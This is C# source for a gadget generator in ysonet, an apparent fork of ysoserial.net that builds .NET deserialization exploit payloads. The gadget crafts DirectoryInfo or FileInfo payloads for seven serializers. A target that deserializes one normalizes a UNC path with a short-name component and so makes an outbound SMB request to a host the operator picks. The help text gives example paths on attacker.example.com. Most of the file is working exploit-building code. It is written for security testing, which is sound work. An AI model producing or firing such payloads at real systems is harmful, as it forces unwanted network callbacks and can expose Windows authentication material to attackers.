using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * FileSystemInfo: makes the TARGET normalize a path the operator chose, and when that path
     * is a UNC path carrying an MS-DOS short name the normalization has to ask the remote host
     * what the long name is. That question is an outbound SMB request.
     *
     * System.IO.FileSystemInfo (mscorlib) is [Serializable] and ISerializable. Its
     * serialization constructor is the whole gadget:
     *
     *   FileSystemInfo(SerializationInfo, StreamingContext)
     *     -> FullPath     = Path.GetFullPathInternal(info.GetString("FullPath"))
     *     -> OriginalPath = info.GetString("OriginalPath")
     *
     *   Path.GetFullPathInternal
     *     -> Path.NormalizePath(path, fullCheck: true)
     *     -> LongPathHelper.Normalize(path, ..., expandShortPaths: true)   (4.6.2+ path handling)
     *        or Path.LegacyNormalizePath(..., expandShortPaths: true)      (UseLegacyPathHandling)
     *     -> TryExpandShortFileName -> kernel32!GetLongPathNameW
     *
     * FileSystemInfo is abstract, so the payload names one of the two concrete subclasses.
     * Both route their own serialization constructor straight to the base one above:
     *
     *   DirectoryInfo(SerializationInfo, StreamingContext) : base(info, context)
     *     -> Directory.CheckPermissions(string.Empty, FullPath, checkHost: false)
     *   FileInfo(SerializationInfo, StreamingContext) : base(info, context)
     *     -> FileIOPermission.QuickDemand(FileIOPermissionAccess.Read, FullPath, ...)
     *
     * The base constructor runs FIRST in both, so the callback happens before either permission
     * check. The checks only matter outside full trust, and FileInfo's is the stricter of the
     * two (a Read demand on the path rather than a permission-object construction), which is
     * the only reason to prefer one variant over the other.
     *
     * WHEN GetLongPathNameW IS CALLED. mscorlib does not ask Windows to expand every path, and
     * this is the condition, read out of LongPathHelper.Normalize:
     *
     *   - a path COMPONENT contains '~', and
     *   - that component is at most 12 characters long.
     *
     * The component may be the last one, and every component after the share counts. So
     * \\host\share\aaaaaa~1\x and \\host\share\aaaaaa~1 both expand, while \\host\share\file
     * and \\host\share\a-very-long-name~1\x do not - the second one has a '~' but its component
     * is longer than 12 characters. A path that does not meet the condition still normalizes
     * fine and simply never calls out. Nothing is refused over this (the shape is a fact about
     * the TARGET's framework, and researching what a target really does is what this tool is
     * for), but --debugmode prints a note when the path cannot trigger the expansion.
     *
     * WHAT IS PROVEN AND WHAT IS NOT. The observed effect is an outbound callback ATTEMPT: the
     * target resolves the host name and opens an SMB request to it. That is not proof that the
     * SMB session completed, that NTLM authentication happened, that credentials were captured,
     * or that anything was relayed. Those depend on the target, the network and the remote
     * endpoint, and this gadget must not be described as delivering them.
     *
     * LOCAL SAFETY. The generator NEVER constructs a real DirectoryInfo or FileInfo: their
     * constructors normalize the path, which would perform the callback from the operator's own
     * machine before a payload even exists. An inert ISerializable marshal carries the type for
     * the runtime formatters, and the three remaining formats are hand written documents.
     *
     * -t IS ACCEPTED, and it behaves the way it does on every other network gadget here
     * (DataViewManagerXxe fetches its DTD, PictureBox loads its URL, WbemClassObjectUnmarshal
     * variant 1 resolves its host): it deserializes the payload in THIS process, so THIS machine
     * makes the callback. That is the effect you asked to see. It is not free of consequences -
     * Windows sends authentication material when it opens an SMB session - so the option help
     * says so and the operator decides.
     */
    public class FileSystemInfoGenerator : GenericGenerator
    {
        // The two concrete targets. Public so the tests can name the exact types instead of
        // repeating the literals (same reason WbemClassObjectUnmarshalGenerator's are public).
        public const string DirectoryInfoClrName = "System.IO.DirectoryInfo";
        public const string FileInfoClrName = "System.IO.FileInfo";
        public const string MscorlibAssemblyName =
            "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        public const string DirectoryInfoTypeName = DirectoryInfoClrName + ", " + MscorlibAssemblyName;
        public const string FileInfoTypeName = FileInfoClrName + ", " + MscorlibAssemblyName;

        // The two members the serialization constructor reads, spelled out because they ARE the
        // payload. FullPath is the one that reaches Path.GetFullPathInternal; OriginalPath is
        // read straight afterwards and must be present or GetString throws before the object is
        // returned. They are written in the order the real FileSystemInfo.GetObjectData writes
        // them, so a reader comparing a captured payload with this one sees the same document.
        public const string OriginalPathMemberName = "OriginalPath";
        public const string FullPathMemberName = "FullPath";

        // The data-contract namespace DataContractSerializer derives from the CLR namespace of
        // both targets. Only the DataContractSerializer document needs it.
        public const string FileSystemInfoContractNamespace =
            "http://schemas.datacontract.org/2004/07/System.IO";

        public const int VariantDirectoryInfo = 1;
        public const int VariantFileInfo = 2;

        // Canonical long name of the variant selector, so the generator, its help and the tests
        // cannot drift apart.
        public const string VariantOptionName = "variant";

        // The longest a path component may be and still be expanded (LongPathHelper.Normalize
        // compares the component length against this). Public so the tests assert the same
        // number the product uses rather than a copy of it.
        public const int MaxShortNameComponentLength = 12;

        private int variantNumber = VariantDirectoryInfo;
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        // Discovery facets (category search only). Both variants do the same thing to the
        // target and differ only in which concrete type the payload names, so neither one
        // overrides the set.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // 4.0 is the floor this project records (see RuntimeVersion); the short-name
                // expansion was observed firing on 4.8.1 by FireFileSystemInfoShortNameExpansion.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // James Forshaw documented FileSystemInfo's serialization constructor as a path
        // normalization sink in his .NET serialization work.
        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a long
        // one pushes the formatter, command-input and category lines off the screen. The path
        // grammar, the evidence limits and the -t warning live in the option help.
        public override string AdditionalInfo()
        {
            return "Normalizes your path on the target. A UNC path with a short-name (~) "
                + "component makes it reach that host over SMB.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and serializes framework types of its own.
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter that can drive an ISerializable CONSTRUCTOR, and only those.
        //
        // That constructor is the whole gadget: FullPath and OriginalPath are protected FIELDS
        // that nothing else assigns from user input, and the normalization happens inside the
        // constructor body. So a serializer that rebuilds an object by setting members BY NAME
        // can never fire this, however well it names the type - which rules out Xaml,
        // XmlSerializer, JavaScriptSerializer, YamlDotNet, FastJson, both SharpSerializer modes
        // and both MessagePack typeless flavours. This is the same structural answer as
        // WbemClassObjectUnmarshal and the exact opposite of DataViewManagerXxe, whose sink IS
        // a property setter.
        //
        // DataContractJsonSerializer IS here, unlike on WbemClassObjectUnmarshal: that gadget's
        // one member is a byte[], which DataContractJsonSerializer cannot express for an
        // ISerializable member at all, while both members here are plain strings.
        //
        // FsPickler is NOT here, and this is the one exclusion that does not follow from the
        // ISerializable rule: it drives ISerializable constructors happily (DataSetXxe ships a
        // FsPickler payload). FsPickler refuses the TYPE, before any document is read -
        // "NonSerializableTypeException: Type 'System.IO.DirectoryInfo' is not serializable" -
        // because FileSystemInfo derives from MarshalByRefObject and FsPickler treats a
        // marshal-by-reference type as unsupported. That is why the DataSet comparison does not
        // carry over: DataSet derives from MarshalByValueComponent, which is by VALUE. No
        // document shape can work around it, so the exclusion is fundamental rather than
        // unproven. See FileSystemInfoDeclaresItsFacets in ysonet.Tests, which proves FsPickler
        // refuses the type on the WRITE side too.
        //
        // Each formatter below was proven by observing the real normalization run on the
        // deserialized object, not by generating: see FileSystemInfoReachesThePathNormalizer
        // (normal tier) and FireFileSystemInfoShortNameExpansion (FULL tier).
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". The two variants differ only in the type token, so every formatter carries
        // both and none of them narrows the list.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter + " (2)",
                Formatters.LosFormatter + " (2)",
                Formatters.NetDataContractSerializer + " (2)",
                Formatters.DataContractSerializer + " (2)",
                Formatters.DataContractJsonSerializer + " (2)",
                Formatters.JsonNet + " (2)",
            };
        }

        // -c is a path the TARGET normalizes. Nothing is resolved, opened or contacted while
        // the payload is built. A UNC path is what makes the gadget interesting, which is why
        // the wizard prompts for one, but any path string is accepted: what a given target does
        // with it is exactly the thing an operator uses this gadget to find out.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.UncPath;
        }

        public override List<GadgetVariant> Variants()
        {
            // Both variants take the same input and produce the same wire shape, so neither
            // narrows the formatter list and neither overrides the facets.
            return new List<GadgetVariant>
            {
                new GadgetVariant(VariantDirectoryInfo,
                    "System.IO.DirectoryInfo (default)"),
                new GadgetVariant(VariantFileInfo,
                    "System.IO.FileInfo - same callback, plus a FileIOPermission read demand"),
            };
        }

        // Canonical long name of the escape hatch, so the generator, its help and the tests
        // cannot drift apart.
        public const string RawInputOptionName = "rawinput";

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which concrete FileSystemInfo the payload names. Both do the same thing to "
                        + "the target - their serialization constructors both run the base "
                        + "FileSystemInfo one, which normalizes -c - and the callback happens "
                        + "before either of their own permission checks. Choices:\r\n"
                        + VariantDirectoryInfo + " (default) - System.IO.DirectoryInfo.\r\n"
                        + VariantFileInfo + " - System.IO.FileInfo. It adds a FileIOPermission "
                        + "read demand on the normalized path, which only matters if the target "
                        + "runs partially trusted; the callback has already happened by then.\r\n"
                        + "\r\n"
                        + "WHAT TO PUT IN -c. Anything the target's Path normalization accepts. "
                        + "The interesting shape is a UNC path with an MS-DOS short-name "
                        + "component, because mscorlib then asks the remote host to expand it "
                        + "with GetLongPathNameW, and that is the outbound SMB request:\r\n"
                        + "  \\\\attacker.example.com\\share\\aaaaaa~1\\x\r\n"
                        + "  \\\\attacker.example.com\\share\\aaaaaa~1\r\n"
                        + "The rule mscorlib applies is that some path COMPONENT contains \"~\" "
                        + "and is at most " + MaxShortNameComponentLength + " characters long. "
                        + "So \\\\host\\share\\file calls out to nobody, and so does "
                        + "\\\\host\\share\\a-long-name~1\\x, whose \"~\" component is too long. "
                        + "Nothing is refused here - a target's own path handling is what you "
                        + "are testing - but --debugmode says when the value cannot trigger the "
                        + "expansion.\r\n"
                        + "\r\n"
                        + "WHAT A CALLBACK PROVES. That the target resolved your host and tried "
                        + "to reach it. It does NOT prove a completed SMB session, NTLM "
                        + "authentication, captured credentials or a relay: those depend on the "
                        + "target, the network and your endpoint.\r\n"
                        + "\r\n"
                        + "-t IS ACCEPTED and it deserializes the payload HERE, so THIS machine "
                        + "does the callback to the host you named - the same as on the other "
                        + "network gadgets. Windows sends authentication material when it opens "
                        + "an SMB session, so only point -t at an endpoint you own, and do not "
                        + "use it on a machine whose outbound traffic you would rather not "
                        + "explain.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    RawInputOptionName,
                    "Put -c into the payload template exactly as typed, instead of escaping it "
                        + "for the selected formatter. Normal mode escapes it, which is what a "
                        + "Windows path needs: every backslash is doubled inside a JSON string, "
                        + "and \"&\" and \"<\" are escaped inside the XML documents. Use this "
                        + "only when you have already escaped the value yourself for the format "
                        + "you picked. It also turns off the check that the finished payload "
                        + "still carries your path unchanged, because there is then no text of "
                        + "yours left to compare against.",
                    v => { if (v != null) rawInput = true; }
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            GuardVariantFormatter(variantNumber, formatter);

            string path = inputArgs.Cmd;
            string targetTypeName = TargetTypeName();
            NoteWhenTheShapeCannotExpand(path, inputArgs);

            object payload;
            if (IsFormatter(formatter, Formatters.BinaryFormatter)
                || IsFormatter(formatter, Formatters.SoapFormatter)
                || IsFormatter(formatter, Formatters.LosFormatter)
                || IsFormatter(formatter, Formatters.NetDataContractSerializer))
                // The marshal below carries the type. No separate DataContract shape is needed
                // for NetDataContractSerializer, because the TARGET is itself ISerializable and
                // so the marshal's member layout is already the one it expects (unlike
                // TempFileCollection, a plain [Serializable] type, which did need one).
                //
                // Serialize() owns minification and, under -t, the read-back that performs the
                // callback from this machine.
                payload = Serialize(new FileSystemInfoMarshal(targetTypeName, path),
                    formatter, inputArgs);
            else if (IsFormatter(formatter, Formatters.DataContractSerializer)
                || IsFormatter(formatter, Formatters.DataContractJsonSerializer)
                || IsFormatter(formatter, Formatters.JsonNet))
                // FinishHandWrittenPayload shrinks the document for its own format and, with -t,
                // reads it back with the serializer the target would use.
                payload = FinishHandWrittenPayload(
                    BuildHandWrittenPayload(formatter, targetTypeName, path),
                    formatter, inputArgs, SelfTestRootType(formatter, inputArgs));
            else
                throw UnsupportedFormatter(formatter);

            RequirePathArrivesIntact(payload, path, formatter, inputArgs);
            return payload;
        }

        // ---- The target type ---------------------------------------------------

        private string TargetTypeName()
        {
            if (variantNumber == VariantDirectoryInfo)
                return DirectoryInfoTypeName;
            if (variantNumber == VariantFileInfo)
                return FileInfoTypeName;

            throw new ArgumentException(Name() + " has no variant " + variantNumber
                + ". Use --" + VariantOptionName + " " + VariantDirectoryInfo + " ("
                + DirectoryInfoClrName + ") or --" + VariantOptionName + " " + VariantFileInfo
                + " (" + FileInfoClrName + ").");
        }

        // The bare type name, which is what an XML element is named after.
        private string BareTargetTypeName()
        {
            return variantNumber == VariantFileInfo ? "FileInfo" : "DirectoryInfo";
        }

        // DataContractJsonSerializer writes no type name into the document, so the -t self-test
        // has to be told what to read it back as. Resolved only when the self-test needs it.
        private Type SelfTestRootType(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return null;
            if (!IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return null;
            return Type.GetType(TargetTypeName(), true);
        }

        // ---- Hand written documents --------------------------------------------

        // The three formats with no object graph. Each is emitted RAW here; shrinking and the
        // -t read-back both happen in FinishHandWrittenPayload.
        private string BuildHandWrittenPayload(string formatter, string targetTypeName, string path)
        {
            if (IsFormatter(formatter, Formatters.DataContractSerializer))
                return BuildDataContractPayload(targetTypeName, path);
            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return BuildDataContractJsonPayload(path);
            if (IsFormatter(formatter, Formatters.JsonNet))
                return BuildJsonNetPayload(targetTypeName, path);
            throw UnsupportedFormatter(formatter);
        }

        // DataContractSerializer carries no type information, so the consumer supplies the root
        // type and the document is read against THAT type's contract. The target is
        // ISerializable, so its contract is its members in NO namespace, each carrying its own
        // xsi type - which is why both members declare xmlns="" and i:type="x:string". The
        // <root type="..."> envelope is this project's usual way of stating the root type a
        // real consumer would have fixed in its own code.
        private string BuildDataContractPayload(string targetTypeName, string path)
        {
            string bare = BareTargetTypeName();
            string value = EscapeForXmlAttribute(path, rawInput);
            return @"<root type=""" + targetTypeName + @"""><" + bare
                + @" xmlns=""" + FileSystemInfoContractNamespace + @""" "
                + @"xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" "
                + @"xmlns:x=""http://www.w3.org/2001/XMLSchema""><" + OriginalPathMemberName
                + @" i:type=""x:string"" xmlns="""">" + value + @"</" + OriginalPathMemberName
                + @"><" + FullPathMemberName + @" i:type=""x:string"" xmlns="""">" + value
                + @"</" + FullPathMemberName + @"></" + bare + @"></root>";
        }

        // No type name in the document at all: the target names the root type itself, which is
        // why SelfTestRootType above has to hand it to the self-test. For an ISerializable type
        // DataContractJsonSerializer reads the members straight off the object, in any order.
        private string BuildDataContractJsonPayload(string path)
        {
            string value = EscapeForJsonDoubleQuoted(path, rawInput);
            return @"{
  """ + OriginalPathMemberName + @""": """ + value + @""",
  """ + FullPathMemberName + @""": """ + value + @"""
}";
        }

        // Json.NET reaches an ISerializable type's constructor when TypeNameHandling resolves
        // the type, so the document is hand written: Json.NET's own serializer would write
        // $type from the marshal's runtime type and ignore SerializationInfo.SetType.
        //
        // The template quotes with DOUBLE quotes, so it escapes with EscapeForJsonDoubleQuoted.
        // EscapeForJson would also write an apostrophe as \', which is not a legal JSON escape:
        // fastJSON drops the character, and a share name containing one would reach the target
        // with it missing.
        private string BuildJsonNetPayload(string targetTypeName, string path)
        {
            string value = EscapeForJsonDoubleQuoted(path, rawInput);
            return @"{
  ""$type"": """ + targetTypeName + @""",
  """ + OriginalPathMemberName + @""": """ + value + @""",
  """ + FullPathMemberName + @""": """ + value + @"""
}";
        }

        // ---- Path fidelity ------------------------------------------------------

        // The path IS the payload, so a payload whose text was rewritten is worse than no
        // payload: it still deserializes and simply calls a host nobody owns, or none at all.
        // Two things in this project rewrite text in a payload (the XML minifier, and an
        // XmlWriter's newline handling), so the rule here is TempFileCollection's and
        // WbemClassObjectUnmarshal's: verify the emitted document, do not predict which
        // characters are at risk.
        // This runs AFTER the self-test, which is deliberate rather than overlooked: the
        // serializers own both the minify pass and the -t read-back, so the emitted document
        // does not exist until they are done. It costs nothing here. The minifier rewrites a
        // path COMPONENT, never the host, so a -t on a lossy path resolves the same host it
        // was always going to resolve, and the run still ends in the refusal with no payload.
        private void RequirePathArrivesIntact(object payload, string path, string formatter,
            InputArgs inputArgs)
        {
            // --rawinput means the operator took responsibility for the exact bytes in the
            // template, so there is nothing here to compare their text against.
            if (rawInput || PathSurvived(payload, path))
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            throw new ArgumentException(Name() + " cannot deliver this path with " + formatter
                + (minified ? " and --minify" : "") + ": the payload no longer carries \"" + path
                + "\" exactly, so the target would normalize a different path."
                + (minified
                    ? " Drop --minify, or use a path with no repeated spaces and no \"; \" sequence."
                    : " Use a path with no carriage return and no leading or trailing whitespace"
                        + " in a component.")
                + " BinaryFormatter and LosFormatter carry the string unchanged.");
        }

        // True when the emitted payload still names the exact path.
        //
        //  - the XML documents (SoapFormatter, NetDataContractSerializer,
        //    DataContractSerializer) put it in a text node, so it is compared through an XML
        //    reader, which decodes &amp; and friends back to what the operator typed;
        //  - the three JSON documents put it in a double quoted string, so the escaped
        //    rendering is what has to be present verbatim;
        //  - BinaryFormatter and LosFormatter produce a stream that is not XML at all, so
        //    AsXmlText returns null and nothing is compared. That is correct: those two carry
        //    string records verbatim and have no minify pass over the text.
        private bool PathSurvived(object payload, string path)
        {
            if (MinifiedTextGuard.AsXmlText(payload) != null)
                return MinifiedTextGuard.MissingTextValues(payload, new[] { path }).Count == 0;

            string text = payload as string;
            if (text == null)
                return true;

            return text.IndexOf(EscapeForJsonDoubleQuoted(path, false), StringComparison.Ordinal) >= 0;
        }

        // ---- The trigger shape (a note, never a refusal) ------------------------

        /// <summary>
        /// True when mscorlib's path normalization would ask Windows to expand a short name in
        /// this path, which is the condition in LongPathHelper.Normalize: some component
        /// contains '~' and is at most <see cref="MaxShortNameComponentLength"/> characters.
        ///
        /// Internal and static so the tests check the same rule the product applies. It looks at
        /// the string only: nothing is resolved, opened or contacted.
        /// </summary>
        internal static bool ShortNameExpansionApplies(string path)
        {
            if (string.IsNullOrEmpty(path))
                return false;

            int componentStart = 0;
            bool sawTilde = false;
            for (int i = 0; i < path.Length; i++)
            {
                char c = path[i];
                if (c == '\\' || c == '/')
                {
                    if (sawTilde && i - componentStart <= MaxShortNameComponentLength)
                        return true;
                    sawTilde = false;
                    componentStart = i + 1;
                }
                else if (c == '~')
                {
                    sawTilde = true;
                }
            }

            // The LAST component counts too: Normalize applies the same test after the loop.
            return sawTilde && path.Length - componentStart <= MaxShortNameComponentLength;
        }

        // A note, on the --debugmode channel only. The payload is built either way: what a
        // target's path handling really does is the thing an operator uses this gadget to find
        // out, and a refusal would block that. ShowNote (not RunResult.Warnings) because ysonet
        // is embedded as a payload generator by other tools, and a normal-run message on a
        // merged stream would end up inside the payload field.
        private void NoteWhenTheShapeCannotExpand(string path, InputArgs inputArgs)
        {
            if (ShortNameExpansionApplies(path))
                return;

            Debugging.ShowNote(inputArgs, Name() + ": \"" + path + "\" has no path component that "
                + "contains \"~\" and is at most " + MaxShortNameComponentLength + " characters, "
                + "so the target will normalize it without calling GetLongPathNameW. The payload "
                + "is still built - only you know what the target does with this path - but if "
                + "you wanted the SMB callback, use a shape like "
                + "\\\\attacker.example.com\\share\\aaaaaa~1\\x.");
        }
    }

    // Emits System.IO.DirectoryInfo or System.IO.FileInfo without ever instantiating either.
    //
    // Instantiating one is exactly what must not happen while building a payload: both
    // constructors normalize the path, and normalizing IS the effect, so ysonet itself would
    // perform the operator's callback.
    //
    // The target IS ISerializable, so the runtime formatters ask this marshal for the member set
    // and hand it straight to the target's serialization constructor. That is why the marshal
    // needs nothing else: no field list, and no separate DataContract shape for
    // NetDataContractSerializer.
    //
    // Internal on purpose: nothing outside this file should be able to hand a path to a type
    // whose constructor reaches the file system and the network.
    [Serializable]
    internal sealed class FileSystemInfoMarshal : ISerializable
    {
        private readonly string _targetTypeName;
        private readonly string _path;

        internal FileSystemInfoMarshal(string targetTypeName, string path)
        {
            _targetTypeName = targetTypeName;
            _path = path;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType(_targetTypeName, true));

            // Written in the order the real FileSystemInfo.GetObjectData writes them.
            // OriginalPath is not the sink, but the constructor reads it right after FullPath
            // and GetString throws when it is missing, so both members must be present.
            info.AddValue(FileSystemInfoGenerator.OriginalPathMemberName, _path, typeof(string));
            info.AddValue(FileSystemInfoGenerator.FullPathMemberName, _path, typeof(string));
        }
    }
}
